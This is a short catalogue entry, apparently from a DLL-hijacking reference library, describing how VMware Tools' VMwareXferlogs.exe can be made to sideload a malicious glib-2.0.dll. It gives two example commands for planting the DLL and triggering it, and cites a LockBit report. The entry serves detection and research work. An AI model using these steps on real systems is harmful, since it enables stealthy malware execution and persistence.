---
trust_level: community
id: windows-dllhijack-glib-2-0
namespace: windows:dllhijack:glib-2-0
name: glib-2.0.dll
description: "glib-2.0.dll — Sideloading hijacking (VMWare)"
author: "Wietze Beukema"
version: "1.0.0"
capabilities:
  - security.defenseevasion.dll-hijack
platforms:
  - windows
techniques:
  - defense-evasion
  - persistence
execution:
  template: "glib-2.0.dll"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
references:
  - label: "Reference"
    url: "https://www.sentinelone.com/labs/lockbit-ransomware-side-loads-cobalt-strike-beacon-with-legitimate-vmware-utility/"
  - label: "HijackLibs"
    url: "https://hijacklibs.net/entries/glib-2-0.html"
---
examples:
  - description: "Place malicious glib-2.0.dll in the search order location"
    command: "copy malicious.dll \"%PROGRAMFILES%\\VMware\\VMware Tools\\glib-2.0.dll\""
  - description: "Execute the vulnerable binary to trigger the hijack"
    command: "\"%PROGRAMFILES%\\VMware\\VMware Tools\\VMwareXferlogs.exe\""

# glib-2.0.dll

**Vendor:** VMWare

**Expected Location:** %PROGRAMFILES%\VMware\VMware Tools

**Vulnerable Executables:**
- %PROGRAMFILES%\VMware\VMware Tools\VMwareXferlogs.exe (Sideloading)
